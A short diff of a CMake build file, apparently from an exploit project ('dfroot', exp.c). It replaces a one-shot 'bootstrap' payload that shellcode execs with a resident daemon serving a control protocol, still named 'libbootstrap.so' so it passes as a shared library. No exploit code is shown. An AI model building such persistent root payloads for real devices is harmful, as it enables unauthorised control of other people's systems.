@@ -49,7 +49,11 @@ set_source_files_properties(exp.c PROPERTIES
 target_link_libraries(dfroot log)
 target_link_options(dfroot PRIVATE -Wl,-z,max-page-size=16384)
 
-add_executable(bootstrap bootstrap.c)
+# dfdaemon replaces the old fire-and-forget bootstrap. It keeps the same
+# output name and staged path ("bootstrap") so the shellcode that execs it
+# needs no change - only the behaviour differs: it stays resident and serves
+# a control protocol instead of running a fixed sequence and exiting.
+add_executable(bootstrap dfdaemon.c)
 set_target_properties(bootstrap PROPERTIES
     PREFIX "lib"
     SUFFIX ".so"
